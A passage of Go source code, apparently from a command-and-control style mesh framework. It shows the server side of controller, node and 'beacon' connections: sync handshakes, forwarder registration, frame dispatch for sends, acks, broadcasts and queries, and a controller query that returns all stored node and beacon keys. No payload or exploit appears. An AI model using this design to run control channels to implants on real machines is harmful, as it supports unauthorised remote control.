		}
		cc.Close()
		cc.Conn.Log(logger.Debug, "disconnected")
	}()
	srv.addCtrlConn(tag, &cc)
	defer srv.deleteCtrlConn(tag)
	_ = conn.SetDeadline(time.Time{})
	cc.Conn.Log(logger.Debug, "connected")
	protocol.HandleConn(conn, cc.onFrame)
}

func (ctrl *ctrlConn) isSync() bool {
	return atomic.LoadInt32(&ctrl.inSync) != 0
}

func (ctrl *ctrlConn) onFrame(frame []byte) {
	if ctrl.Conn.onFrame(frame) {
		return
	}
	if frame[0] == protocol.ConnSendHeartbeat {
		ctrl.Conn.HandleHeartbeat()
		return
	}
	if ctrl.isSync() {
		if ctrl.onFrameAfterSync(frame) {
			return
		}
	} else {
		if ctrl.onFrameBeforeSync(frame) {
			return
		}
	}
	const format = "unknown command: %d\nframe:\n%s"
	ctrl.Conn.Logf(logger.Exploit, format, frame[0], spew.Sdump(frame))
	ctrl.Close()
}

func (ctrl *ctrlConn) onFrameBeforeSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	data := frame[protocol.FrameCMDSize+protocol.FrameIDSize:]
	switch frame[0] {
	case protocol.CtrlSync:
		ctrl.handleSyncStart(id)
	case protocol.CtrlTrustNode:
		ctrl.handleTrustNode(id)
	case protocol.CtrlSetNodeCert:
		ctrl.handleSetCertificate(id, data)
	case protocol.CtrlQueryListeners:
		ctrl.handleQueryListeners(id)
	case protocol.CtrlQueryKeyStorage:
		ctrl.handleQueryKeyStorage(id)
	default:
		return false
	}
	return true
}

func (ctrl *ctrlConn) handleSyncStart(id []byte) {
	ctrl.syncMu.Lock()
	defer ctrl.syncMu.Unlock()
	if ctrl.isSync() {
		return
	}
	// initialize sync pool
	ctrl.Conn.SendPool.New = func() interface{} {
		return protocol.NewSend()
	}
	ctrl.Conn.AckPool.New = func() interface{} {
		return protocol.NewAcknowledge()
	}
	ctrl.Conn.AnswerPool.New = func() interface{} {
		return protocol.NewAnswer()
	}
	// must presume, or may be lost message.
	atomic.StoreInt32(&ctrl.inSync, 1)
	err := ctrl.ctx.forwarder.RegisterCtrl(ctrl)
	if err != nil {
		atomic.StoreInt32(&ctrl.inSync, 0)
		ctrl.Conn.Reply(id, []byte(err.Error()))
		ctrl.Close()
		return
	}
	ctrl.Conn.Reply(id, []byte{protocol.NodeSync})
	ctrl.Conn.Log(logger.Debug, "start to synchronize")
}

func (ctrl *ctrlConn) handleTrustNode(id []byte) {
	ctrl.Conn.Reply(id, ctrl.ctx.register.PackRequest("trust"))
}

func (ctrl *ctrlConn) handleSetCertificate(id []byte, data []byte) {
	err := ctrl.ctx.global.SetCertificate(data)
	if err == nil {
		ctrl.Conn.Reply(id, []byte{messages.RegisterResultAccept})
		ctrl.Conn.Log(logger.Debug, "trust node")
	} else {
		ctrl.Conn.Reply(id, []byte(err.Error()))
	}
}

func (ctrl *ctrlConn) handleQueryListeners(id []byte) {
	listeners := make(map[string]*bootstrap.Listener)
	for tag, listener := range ctrl.ctx.server.Listeners() {
		// lAddr := listener.Addr()
		listeners[tag] = &bootstrap.Listener{
			Mode:    listener.Mode(),
			Network: "",
			Address: "",
		}
	}
	data, err := msgpack.Marshal(&listeners)
	if err != nil {
		ctrl.Conn.Reply(id, append([]byte{1}, []byte(err.Error())...))
	} else {
		ctrl.Conn.Reply(id, append([]byte{2}, data...))
	}
}

func (ctrl *ctrlConn) handleQueryKeyStorage(id []byte) {
	storage := protocol.KeyStorage{
		NodeKeys:   ctrl.ctx.storage.GetAllNodeKeys(),
		BeaconKeys: ctrl.ctx.storage.GetAllBeaconKeys(),
	}
	data, err := msgpack.Marshal(&storage)
	if err != nil {
		ctrl.Conn.Reply(id, append([]byte{1}, []byte(err.Error())...))
	} else {
		ctrl.Conn.Reply(id, append([]byte{2}, data...))
	}
}

func (ctrl *ctrlConn) onFrameAfterSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	data := frame[protocol.FrameCMDSize+protocol.FrameIDSize:]
	switch frame[0] {
	case protocol.CtrlSendToNodeGUID:
		ctrl.Conn.HandleSendToNodeGUID(id, data)
	case protocol.CtrlSendToNode:
		ctrl.Conn.HandleSendToNode(id, data)
	case protocol.CtrlAckToNodeGUID:
		ctrl.Conn.HandleAckToNodeGUID(id, data)
	case protocol.CtrlAckToNode:
		ctrl.Conn.HandleAckToNode(id, data)
	case protocol.CtrlSendToBeaconGUID:
		ctrl.Conn.HandleSendToBeaconGUID(id, data)
	case protocol.CtrlSendToBeacon:
		ctrl.Conn.HandleSendToBeacon(id, data)
	case protocol.CtrlAckToBeaconGUID:
		ctrl.Conn.HandleAckToBeaconGUID(id, data)
	case protocol.CtrlAckToBeacon:
		ctrl.Conn.HandleAckToBeacon(id, data)
	case protocol.CtrlBroadcastGUID:
		ctrl.Conn.HandleBroadcastGUID(id, data)
	case protocol.CtrlBroadcast:
		ctrl.Conn.HandleBroadcast(id, data)
	case protocol.CtrlAnswerGUID:
		ctrl.Conn.HandleAnswerGUID(id, data)
	case protocol.CtrlAnswer:
		ctrl.Conn.HandleAnswer(id, data)
	default:
		return false
	}
	return true
}

func (ctrl *ctrlConn) Close() {
	_ = ctrl.Conn.Close()
}

// ------------------------------------------serve Node--------------------------------------------

type nodeConn struct {
	ctx *Node

	GUID *guid.GUID
	Conn *conn

	inSync int32
	syncMu sync.Mutex
}

func (srv *server) serveNode(tag *guid.GUID, conn *xnet.Conn, nodeGUID *guid.GUID) {
	nc := nodeConn{
		ctx:  srv.ctx,
		GUID: nodeGUID,
		Conn: newConn(srv.ctx, conn, nodeGUID, connUsageServeNode),
	}
	defer func() {
		if r := recover(); r != nil {
			nc.Conn.Log(logger.Fatal, xpanic.Print(r, "server.serveNode"))
		}
		// logoff forwarder
		nc.syncMu.Lock()
		defer nc.syncMu.Unlock()
		if nc.isSync() {
			srv.ctx.forwarder.LogoffNode(nodeGUID)
		}
		nc.Close()
		nc.Conn.Log(logger.Debug, "disconnected")
	}()
	srv.addNodeConn(tag, &nc)
	defer srv.deleteNodeConn(tag)
	_ = conn.SetDeadline(time.Time{})
	nc.Conn.Log(logger.Debug, "connected")
	protocol.HandleConn(conn, nc.onFrame)
}

func (node *nodeConn) isSync() bool {
	return atomic.LoadInt32(&node.inSync) != 0
}

func (node *nodeConn) onFrame(frame []byte) {
	if node.Conn.onFrame(frame) {
		return
	}
	if frame[0] == protocol.ConnSendHeartbeat {
		node.Conn.HandleHeartbeat()
		return
	}
	if node.isSync() {
		if node.onFrameAfterSync(frame) {
			return
		}
	} else {
		if node.onFrameBeforeSync(frame) {
			return
		}
	}
	const format = "unknown command: %d\nframe:\n%s"
	node.Conn.Logf(logger.Exploit, format, frame[0], spew.Sdump(frame))
	node.Close()
}

func (node *nodeConn) onFrameBeforeSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	switch frame[0] {
	case protocol.NodeSync:
		node.handleSyncStart(id)
	default:
		return false
	}
	return true
}

func (node *nodeConn) handleSyncStart(id []byte) {
	node.syncMu.Lock()
	defer node.syncMu.Unlock()
	if node.isSync() {
		return
	}
	// initialize sync pool
	node.Conn.SendPool.New = func() interface{} {
		return protocol.NewSend()
	}
	node.Conn.AckPool.New = func() interface{} {
		return protocol.NewAcknowledge()
	}
	node.Conn.AnswerPool.New = func() interface{} {
		return protocol.NewAnswer()
	}
	node.Conn.QueryPool.New = func() interface{} {
		return protocol.NewQuery()
	}
	// must presume, or may be lost message.
	atomic.StoreInt32(&node.inSync, 1)
	err := node.ctx.forwarder.RegisterNode(node)
	if err != nil {
		atomic.StoreInt32(&node.inSync, 0)
		node.Conn.Reply(id, []byte(err.Error()))
		node.Close()
		return
	}
	node.Conn.Reply(id, []byte{protocol.NodeSync})
	node.Conn.Log(logger.Info, "start to synchronize")
}

func (node *nodeConn) onFrameAfterSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	data := frame[protocol.FrameCMDSize+protocol.FrameIDSize:]
	if node.onFrameAfterSyncAboutCtrl(frame[0], id, data) {
		return true
	}
	if node.onFrameAfterSyncAboutNode(frame[0], id, data) {
		return true
	}
	if node.onFrameAfterSyncAboutBeacon(frame[0], id, data) {
		return true
	}
	return false
}

func (node *nodeConn) onFrameAfterSyncAboutCtrl(cmd byte, id, data []byte) bool {
	switch cmd {
	case protocol.CtrlSendToNodeGUID:
		node.Conn.HandleSendToNodeGUID(id, data)
	case protocol.CtrlSendToNode:
		node.Conn.HandleSendToNode(id, data)
	case protocol.CtrlAckToNodeGUID:
		node.Conn.HandleAckToNodeGUID(id, data)
	case protocol.CtrlAckToNode:
		node.Conn.HandleAckToNode(id, data)
	case protocol.CtrlSendToBeaconGUID:
		node.Conn.HandleSendToBeaconGUID(id, data)
	case protocol.CtrlSendToBeacon:
		node.Conn.HandleSendToBeacon(id, data)
	case protocol.CtrlAckToBeaconGUID:
		node.Conn.HandleAckToBeaconGUID(id, data)
	case protocol.CtrlAckToBeacon:
		node.Conn.HandleAckToBeacon(id, data)
	case protocol.CtrlBroadcastGUID:
		node.Conn.HandleBroadcastGUID(id, data)
	case protocol.CtrlBroadcast:
		node.Conn.HandleBroadcast(id, data)
	case protocol.CtrlAnswerGUID:
		node.Conn.HandleAnswerGUID(id, data)
	case protocol.CtrlAnswer:
		node.Conn.HandleAnswer(id, data)
	default:
		return false
	}
	return true
}

func (node *nodeConn) onFrameAfterSyncAboutNode(cmd byte, id, data []byte) bool {
	switch cmd {
	case protocol.NodeSendGUID:
		node.Conn.HandleNodeSendGUID(id, data)
	case protocol.NodeSend:
		node.Conn.HandleNodeSend(id, data)
	case protocol.NodeAckGUID:
		node.Conn.HandleNodeAckGUID(id, data)
	case protocol.NodeAck:
		node.Conn.HandleNodeAck(id, data)
	default:
		return false
	}
	return true
}

func (node *nodeConn) onFrameAfterSyncAboutBeacon(cmd byte, id, data []byte) bool {
	switch cmd {
	case protocol.BeaconSendGUID:
		node.Conn.HandleBeaconSendGUID(id, data)
	case protocol.BeaconSend:
		node.Conn.HandleBeaconSend(id, data)
	case protocol.BeaconAckGUID:
		node.Conn.HandleBeaconAckGUID(id, data)
	case protocol.BeaconAck:
		node.Conn.HandleBeaconAck(id, data)
	case protocol.BeaconQueryGUID:
		node.Conn.HandleQueryGUID(id, data)
	case protocol.BeaconQuery:
		node.Conn.HandleQuery(id, data)
	default:
		return false
	}
	return true
}

func (node *nodeConn) Close() {
	_ = node.Conn.Close()
}

// -----------------------------------------serve Beacon-------------------------------------------

type beaconConn struct {
	ctx *Node

	GUID *guid.GUID // beacon guid
	Conn *conn

	inSync int32
	syncMu sync.Mutex
}

func (srv *server) serveBeacon(tag *guid.GUID, conn *xnet.Conn, beaconGUID *guid.GUID) {
	bc := beaconConn{
		ctx:  srv.ctx,
		GUID: beaconGUID,
		Conn: newConn(srv.ctx, conn, beaconGUID, connUsageServeBeacon),
	}
	defer func() {
		if r := recover(); r != nil {
			bc.Conn.Log(logger.Fatal, xpanic.Print(r, "server.serveBeacon"))
		}
		// logoff forwarder
		bc.syncMu.Lock()
		defer bc.syncMu.Unlock()
		if bc.isSync() {
			srv.ctx.forwarder.LogoffBeacon(beaconGUID)
		}
		bc.Close()
		bc.Conn.Log(logger.Debug, "disconnected")
	}()
	srv.addBeaconConn(tag, &bc)
	defer srv.deleteBeaconConn(tag)
	_ = conn.SetDeadline(time.Time{})
	bc.Conn.Log(logger.Debug, "connected")
	protocol.HandleConn(conn, bc.onFrame)
}

func (beacon *beaconConn) isSync() bool {
	return atomic.LoadInt32(&beacon.inSync) != 0
}

func (beacon *beaconConn) onFrame(frame []byte) {
	if beacon.Conn.onFrame(frame) {
		return
	}
	if frame[0] == protocol.ConnSendHeartbeat {
		beacon.Conn.HandleHeartbeat()
		return
	}
	if beacon.isSync() {
		if beacon.onFrameAfterSync(frame) {
			return
		}
	} else {
		if beacon.onFrameBeforeSync(frame) {
			return
		}
	}
	const format = "unknown command: %d\nframe:\n%s"
	beacon.Conn.Logf(logger.Exploit, format, frame[0], spew.Sdump(frame))
	beacon.Close()
}

func (beacon *beaconConn) onFrameBeforeSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	switch frame[0] {
	case protocol.BeaconSync:
		beacon.handleSyncStart(id)
	default:
		return false
	}
	return true
}

func (beacon *beaconConn) handleSyncStart(id []byte) {
	beacon.syncMu.Lock()
	defer beacon.syncMu.Unlock()
	if beacon.isSync() {
		return
	}
	// initialize sync pool
	beacon.Conn.SendPool.New = func() interface{} {
		return protocol.NewSend()
	}
	beacon.Conn.AckPool.New = func() interface{} {
		return protocol.NewAcknowledge()
	}
	beacon.Conn.QueryPool.New = func() interface{} {
		return protocol.NewQuery()
	}
	// must presume, or may be lost message.
	atomic.StoreInt32(&beacon.inSync, 1)
	err := beacon.ctx.forwarder.RegisterBeacon(beacon)
	if err != nil {
		atomic.StoreInt32(&beacon.inSync, 0)
		beacon.Conn.Reply(id, []byte(err.Error()))
		beacon.Close()
		return
	}
	beacon.Conn.Reply(id, []byte{protocol.NodeSync})
	beacon.Conn.Log(logger.Info, "start to synchronize")
}

func (beacon *beaconConn) onFrameAfterSync(frame []byte) bool {
	id := frame[protocol.FrameCMDSize : protocol.FrameCMDSize+protocol.FrameIDSize]
	data := frame[protocol.FrameCMDSize+protocol.FrameIDSize:]
	switch frame[0] {
	case protocol.BeaconSendGUID:
		beacon.Conn.HandleBeaconSendGUID(id, data)
	case protocol.BeaconSend:
		beacon.Conn.HandleBeaconSend(id, data)
	case protocol.BeaconAckGUID:
		beacon.Conn.HandleBeaconAckGUID(id, data)
	case protocol.BeaconAck:
		beacon.Conn.HandleBeaconAck(id, data)
	case protocol.BeaconQueryGUID:
		beacon.Conn.HandleQueryGUID(id, data)
	case protocol.BeaconQuery:
		beacon.Conn.HandleQuery(id, data)
	default:
		return false
	}
	return true
}

func (beacon *beaconConn) Close() {
	_ = beacon.Conn.Close()
}
